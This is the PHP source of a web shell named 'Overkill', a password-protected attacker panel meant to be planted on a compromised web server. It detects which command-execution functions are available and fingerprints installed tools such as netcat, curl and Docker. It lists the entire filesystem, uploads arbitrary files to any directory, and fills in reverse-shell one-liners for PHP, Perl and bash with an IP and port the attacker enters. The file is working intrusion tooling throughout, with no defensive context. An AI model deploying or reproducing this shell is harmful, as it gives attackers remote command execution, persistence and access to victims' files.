<?php
ob_start();

// ?   PROTECTED LOGIN START
$MASTER_PASSWORD = 'yourStrongMasterPasswordHere';
$COOKIE_NAME = 'sql_auth';
$COOKIE_TTL = time() + (86400 * 30);  // 30 days

// Handle login form submission
if (isset($_POST['master_password'])) {
    if ($_POST['master_password'] === $MASTER_PASSWORD) {
        setcookie($COOKIE_NAME, hash('sha256', $MASTER_PASSWORD), $COOKIE_TTL, '/', '', false, true);
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    } else {
        $login_error = 'Invalid password.';
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    setcookie($COOKIE_NAME, '', time() - 3600, '/', '', false, true);  // Expire the cookie
    setcookie('sql_auth_data', '', time() - 3600, '/', '', false, true);
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// Authentication check
$authenticated = false;
if (isset($_COOKIE[$COOKIE_NAME])) {
    if ($_COOKIE[$COOKIE_NAME] === hash('sha256', $MASTER_PASSWORD)) {
        $authenticated = true;
    }
}

// Show login form if not authenticated
if (!$authenticated) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login - SQL WebShell</title>
        <style>
            body {
                background: #111;
                color: #eee;
                font-family: monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            form {
                background: #1a1a1a;
                padding: 20px;
                border-radius: 10px;
                border: 1px solid #333;
                width: 300px;
                box-sizing: border-box;
            }
            input[type="password"] {
                width: 100%;
                padding: 10px;
                margin-bottom: 10px;
                background: #222;
                color: #0f0;
                border: 1px solid #444;
                font-family: monospace;
                box-sizing: border-box;
            }
            button {
                width: 100%;
                padding: 10px;
                background: #333;
                color: #0f0;
                border: none;
                cursor: pointer;
                font-family: monospace;
            }
            button:hover {
                background: #0f0;
                color: #000;
            }
            .error {
                color: red;
                margin-bottom: 10px;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <form method="POST" autocomplete="off">
            <h2 style="text-align:center;">Enter Master Password</h2>
            <?php if (!empty($login_error)): ?>
                <div class="error"><?= htmlspecialchars($login_error) ?></div>
            <?php endif; ?>
            <input type="password" name="master_password" placeholder="Master Password" required autofocus />
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// !   PROTECTED LOGIN STOP

// ? FUNCTIONS START
function check_command_execution()
{
    /*
     * Checks what commands can be executed using PHP
     */
    $methods = ['shell_exec', 'exec', 'system', 'passthru', 'popen'];
    $available = [];

    // Get disabled functions from php.ini
    $disabled = explode(',', ini_get('disable_functions'));
    $disabled = array_map('trim', $disabled);

    foreach ($methods as $method) {
        if (function_exists($method) && is_callable($method) && !in_array($method, $disabled)) {
            $available[] = $method;
        }
    }

    return $available;
}

function execute_command($cmd, $available_methods)
{
    /*
     * Execute command using the available methods
     * $cmd -> string
     * $available_methods -> array OR string
     */
    $output = '';

    if (is_string($available_methods)) {
        $available_methods = [$available_methods];
    }

    foreach ($available_methods as $method) {
        switch ($method) {
            case 'shell_exec':
                $output = shell_exec($cmd);
                if ($output !== null)
                    return $output;
                break;

            case 'exec':
                $out = [];
                exec($cmd, $out);
                if (!empty($out))
                    return implode("\n", $out);
                break;

            case 'system':
                ob_start();
                system($cmd);
                $output = ob_get_clean();
                if (!empty($output))
                    return $output;
                break;

            case 'passthru':
                ob_start();
                passthru($cmd);
                $output = ob_get_clean();
                if (!empty($output))
                    return $output;
                break;

            case 'popen':
                $handle = popen($cmd, 'r');
                if ($handle) {
                    $output = '';
                    while (!feof($handle)) {
                        $output .= fread($handle, 1024);
                    }
                    pclose($handle);
                    if (!empty($output))
                        return $output;
                }
                break;
        }
    }

    return 'All command execution methods failed or returned no output.';
}

function get_regex_version($command, $regex, $available_methods)
{
    if (empty($available_methods)) {
        return 'No execution';
    }

    // If it's an array, pick the first element; otherwise, use it as-is
    $method = is_array($available_methods) ? reset($available_methods) : $available_methods;

    $output = execute_command($command, $method);

    return preg_match($regex, $output, $m) ? $m[1] : 'Not found';
}

function check_install(string $command, ?string $check = null, array $available_methods = []): string
{
    $method = is_array($available_methods) ? reset($available_methods) : $available_methods;

    $output = execute_command($command, $method);

    if ($check === null) {
        // If just checking execution status
        return $output !== null && trim($output) !== '' ? 'YES' : 'NO';
    }

    // Check if output contains the expected string
    return strpos($output, $check) !== false ? 'YES' : 'NO';
}

function is_in_docker(): int
{
    $score = 0;
    $max_score = 4;

    // Strong signal: presence of .dockerenv
    if (file_exists('/.dockerenv')) {
        $score += 2;
    }

    // Medium signal: docker or containerd in cgroup
    if (
        is_readable('/proc/1/cgroup') &&
        preg_match('/docker|containerd/', file_get_contents('/proc/1/cgroup'))
    ) {
        $score += 1;
    }

    // Weak signal: hostname pattern
    $hostname = gethostname();
    if (preg_match('/^[0-9a-f]{12}$/', $hostname)) {
        $score += 1;
    }

    // Convert to percent
    return intval(($score / $max_score) * 100);
}

if (isset($_GET['path'])) {
    $path = $_GET['path'];
    if (is_dir($path)) {
        listDirectory($path);
    }
    exit;
}

function listDirectory($path) {
    $path = realpath($path);
    if (!$path || !is_dir($path)) return;

    $items = @scandir($path);
    if (!$items) return;

    // Filter out '.' and '..' and reindex
    $items = array_values(array_filter($items, fn($item) => $item !== '.' && $item !== '..'));

    echo '<ul>';

    $count = count($items);
    $isRoot = ($path === '/');

    foreach ($items as $index => $item) {
        $full = rtrim($path, '/') . '/' . $item;
        $safePath = htmlspecialchars($full, ENT_QUOTES);
        $safeName = htmlspecialchars($item);

        // Determine class for branch symbol, skip for root level
        $branchClass = '';
        if (!$isRoot) {
            $branchClass = ($index === $count - 1) ? 'last-item' : 'middle-item';
        }

        if (is_dir($full)) {
            echo '<li' . ($branchClass ? ' class="' . $branchClass . '"' : '') . '>';
            echo '<span class="folder" data-path="' . $safePath . '">' . $safeName . '</span><div class="nested"></div></li>';
        } else {
            echo '<li' . ($branchClass ? ' class="' . $branchClass . '"' : '') . '>';
            echo '<span class="file">' . $safeName . '</span></li>';
        }
    }
    echo '</ul>';
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadFile']) && isset($_POST['uploadPath'])) {
    header('Content-Type: application/json');

    $uploadPath = realpath($_POST['uploadPath']);
    if (!$uploadPath || !is_dir($uploadPath)) {
        echo json_encode(['success' => false, 'error' => 'Invalid upload path']);
        exit;
    }

    $uploadFile = $_FILES['uploadFile'];

    if ($uploadFile['error'] !== UPLOAD_ERR_OK) {
        echo json_encode(['success' => false, 'error' => 'Upload error code: ' . $uploadFile['error']]);
        exit;
    }

    $filename = basename($uploadFile['name']);
    $destination = rtrim($uploadPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;

    if (move_uploaded_file($uploadFile['tmp_name'], $destination)) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Failed to move uploaded file']);
    }
    exit;
}


// ! FUNCTIONS STOP

// ? VARIABLES START
$available_ce_methods = check_command_execution();
$services = [
    'NetCat' => [
        'status' => check_install('nc -h', 'connect to somewhere:', $available_ce_methods),
        'version' => get_regex_version('nc -h', '/\[(v[^\]]+)\]/', $available_ce_methods)
    ],
    'SSH' => [
        'status' => check_install('ssh', 'usage: ssh', $available_ce_methods),
        'version' => get_regex_version('ssh -V', '/OpenSSH_([\d\.p]+)/', $available_ce_methods)
    ],
    'MySQL' => [
        'status' => check_install('mysql --version', 'mysql from ', $available_ce_methods),
        'version' => get_regex_version('mysql --version', '/Ver\s+([\d\.]+)-MariaDB/', $available_ce_methods)
    ],
    'MariaDB' => [
        'status' => check_install('mariadb --version', 'mariadb from ', $available_ce_methods),
        'version' => get_regex_version('mariadb --version', '/Ver\s+([\d\.]+)-MariaDB/', $available_ce_methods)
    ],
    'PostgreSQL' => [
        'status' => check_install('psql --help', 'psql is the PostgreSQL', $available_ce_methods),
        'version' => get_regex_version('psql --version', '/psql \(PostgreSQL\) ([\d\.]+) /', $available_ce_methods)
    ],
    'Python' => [
        'status' => check_install('python --help', 'usage: python', $available_ce_methods),
        'version' => execute_command('python --version', $available_ce_methods),
        'shell' => 'a'
    ],
    'PHP' => [
        'status' => check_install('php --help', 'Usage: php', $available_ce_methods),
        'version' => get_regex_version('php --version', '/PHP\s+([\d\.]+)/', $available_ce_methods),
        'shell' => 'php -r \'$sock=fsockopen("IP",PORT);system("bash <&3 >&3 2>&3");\''
    ],
    'Perl' => [
        'status' => check_install('perl --help', 'Usage: perl', $available_ce_methods),
        'version' => get_regex_version('perl --version', '/\(v([\d\.]+)\)/', $available_ce_methods),
        'shell' => 'perl -e \'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};\''
    ],    
    'Ruby' => [
        'status' => check_install('ruby --help', 'ruby [switches]', $available_ce_methods),
        'version' => get_regex_version('ruby --version', '/ruby\s+([\d\.]+)p\d+/', $available_ce_methods),
        'shell' => 'a'
    ],
    'bash' => [
        'status' => check_install('bash --version', 'GNU bash,', $available_ce_methods),
        'version' => get_regex_version('bash --version', '/version\s+([\d\.]+)\(/', $available_ce_methods),
        'shell' => 'bash -i >& /dev/tcp/IP/PORT 0>&1'
    ],
    'cURL' => [
        'status' => check_install('curl --help', 'Usage: curl', $available_ce_methods),
        'version' => get_regex_version('curl --version', '/\bcurl\s+([\d\.]+)\b/', $available_ce_methods)
    ],
    'wget' => [
        'status' => check_install('wget --help', 'Usage: wget', $available_ce_methods),
        'version' => get_regex_version('wget --version', '/GNU Wget\s+([\d\.]+)/', $available_ce_methods)
    ],
    'Docker' => [
        'status' => check_install('docker --help', 'Usage:  docker', $available_ce_methods),
        'version' => get_regex_version('docker --version', '/Docker version ([\d\.]+)/', $available_ce_methods)
    ]
];

// ! VARIABLES STOP

// ? DISPLAY FUNCTIONs START
// ! DISPLAY FUNCTIONS STOP

// ?   MAIN HTML START
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Overkill</title>
    <style>
        body {
            margin: 0;
            background: #111;
            color: #eee;
            font-family: monospace;
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-template-rows: auto auto;
            gap: 10px;
            padding: 20px;
        }
        .card {
            background: #1a1a1a;
            padding: 15px;
            border: 1px solid #333;
            border-radius: 10px;
            max-height: 50vh;
            margin-top: 5px;
            margin-bottom: 5px;
        }
        input, select, textarea, button, a, .services {
            width: 100%;
            background: #222;
            color: #0f0;
            border: 1px solid #444;
            padding: 8px;
            box-sizing: border-box;
        }
        input[type="file"]{
            width: 200px !important;
        }
        .btn {
            background: #333;
            color: #0f0;
            cursor: pointer;
        }
        .btn:hover:not(:disabled) {
            background: #0f0;
            color: #000;
        }
        .btn-red{
            background: #333;
            color: #f00 !important;
            cursor: pointer;
        }
        .btn-red:hover:not(:disabled){
            background: #f00 !important;
            color: #000 !important;
        }
        .btn:disabled,.btn-red:disabled{
            background: #1a1a1a !important;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        th, td {
            border: 1px solid #666;
            padding: 5px;
        }
        .span-column {
            grid-column: span 2;
        }

        .span-row {
            grid-row: span 2;
        }

        .flex-row{
            display: inline-flex; 
            align-items: center;
            gap: 15px;
        }
        .flex-column{
            display: inline-flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 15px;
        }

        .error {
            color: red;
            margin-bottom: 10px;
            font-size: 0.9em;
        }

        #loading-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.9);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5em;
            color: #eee;
            user-select: none;
        }
        body.loading {
            pointer-events: none;
            user-select: none;
        }
        #result-content {
            overflow: auto;
            transform: rotateX(180deg);
        }
        #result-child-content {
            transform: rotateX(-180deg);
        }

        #file-tree-container {
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        #file-tree {
            overflow: auto;
            white-space: nowrap;
            flex: 1;
            margin: 0px;
        }
        ul {
            list-style-type: none;
            padding-left: 1em;
        }
        .folder {
            font-weight: bold;
            cursor: pointer;
            color: #4d90fe;
            padding: 2px 0px;
            border-radius: 4px;
            display: inline-block;
        }
        .file {
            cursor: pointer;
            color: white;
            padding: 2px 0px;
            border-radius: 4px;
            display: inline-block;
        }
        .nested {
            display: none;
        }
        .open > .nested {
            display: block;
        }
        .selected {
            border: 2px solid #4d90fe;
            background-color: #2a2a2a;
        }
        li.middle-item::before {
            content: "├ ";
            color: #888;
            font-family: monospace;
        }

        li.last-item::before {
            content: "└ ";
            color: #888;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="grid">
        <div class="card">
            <!-- Services, Auto Revshell Generator -->
            <div class="card flex-row">
                <h3>Services</h3>
                <?php
                foreach ($services as $name => $service) {
                    $is_disabled = isset($service['status']) && $service['status'] === 'NO';
                    $has_shell = !empty($service['shell'] ?? '');
                
                    // Determine class
                    $class = $is_disabled ? 'btn-red' : 'btn';
                
                    // Determine attributes
                    if ($is_disabled || !$has_shell) {
                        $attributes = 'disabled';
                    } else {
                        $escaped_shell = htmlspecialchars(str_replace("'", "\\'", $service['shell']));
                        $attributes = 'onclick="genShell(\'' . $escaped_shell . '\')"';
                    }
                
                    echo '<button class="' . $class . '" ' . $attributes . '>' . htmlspecialchars($name) . '</button>' . PHP_EOL;
                }                
                ?>
            </div>
            <div class="card">
                <h3>Reverse Shell</h3>
                <div class="flex-row">
                    <input id="revshell_ip" type="text" placeholder="IP:">
                    <input id="revshell_port" type="text" placeholder="PORT:">
                </div>
                <pre class="card" id="revshell" style="white-space:pre-wrap">Generate revshell by clicking on Services</pre>
            </div>
        </div>
        <div id="file-tree-container" class="card span-row">
            <input type="hidden" id="selectedPath" name="selectedPath" value="/">
            <h3>Folders And Files</h3>
            <ul id="file-tree">
                <?php listDirectory('/'); ?>
            </ul>   
        </div>
        <div class="card">
            <div class="flex-column">
                <div class="flex-row">
                    <label for="uploadFileInput">Upload&nbsp;File:</label>
                    <input id="uploadFileInput" name="uploadFile" type="file">
                </div>
                <div class="flex-row">
                    <label for="urlUpload">URL&nbsp;Upload:</label>
                    <input id="urlUpload" type="text" placeholder="URL:">
                    <input id="urlUploadName" type="text" placeholder="File Name:">
                    <input id="urlUploadSubmit" class="btn" type="button" value="Submit">
                </div>
                <button class="btn">Download</button>
                <button class="btn">Dump&nbsp;Folder</button>
                <button class="btn">Clean&nbsp;Up</button>
            </div>
        </div>
        <div class="card span-column">Execute, Command History</div>
        
        
    </div>
</body>

<script>
    function refreshFolder(path, targetElement) {
        fetch('?path=' + encodeURIComponent(path))
            .then(response => response.text())
            .then(html => {
                targetElement.innerHTML = html;
            });
    }
</script>

<script>
    document.getElementById('uploadFileInput').addEventListener('change', function() {
        const fileInput = document.getElementById('uploadFileInput');
        const file = fileInput.files[0];
        if (!file) return;

        const selectedPath = document.getElementById('selectedPath').value || '/';

        const formData = new FormData();
        formData.append('uploadFile', file);
        formData.append('uploadPath', selectedPath);

        fetch(window.location.pathname, {
            method: 'POST',
            body: formData
        })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                alert('Upload successful!');
                fileInput.value = '';

                // Find the currently selected folder and its nested <ul> to refresh
                const selectedFolder = document.querySelector('.folder.selected');
                if (selectedFolder) {
                    const nested = selectedFolder.nextElementSibling;
                    if (nested) {
                        refreshFolder(selectedPath, nested);
                    }
                }
            } else {
                alert('Upload error: ' + data.error);
            }
        })
        .catch(err => {
            alert('Upload failed: ' + err.message);
        });
    });
</script>

<script>
    document.getElementById('file-tree').addEventListener('click', function (e) {
        if (e.target.classList.contains('folder')) {
            const el = e.target;
            const path = el.getAttribute('data-path');
            const parent = el.parentElement;

            // Deselect previous
            document.querySelectorAll('.folder.selected').forEach(f => f.classList.remove('selected'));
            el.classList.add('selected');
            selectedDir = path;
            document.getElementById('selectedPath').value = path;

            // Toggle display
            parent.classList.toggle('open');

            const nested = el.nextElementSibling;

            // Refresh folder view
            refreshFolder(path, nested);
        }
    });
</script>

<script>
    function genShell(shellTemplate) {
        const ip = document.getElementById('revshell_ip')?.value || '';
        const port = document.getElementById('revshell_port')?.value || '';
        const outputBlock = document.getElementById('revshell');

        if (!ip || !port) {
            alert("Please provide both IP and PORT.");
            return;
        }

        const finalShell = shellTemplate
            .replace(/IP/g, ip)
            .replace(/PORT/g, port);

        if (outputBlock) {
            outputBlock.textContent = finalShell;
        } else {
            console.warn('Output element with ID "revshell" not found.');
        }
    }
</script>
</html>
<?php

// !   MAIN HTML STOP
?>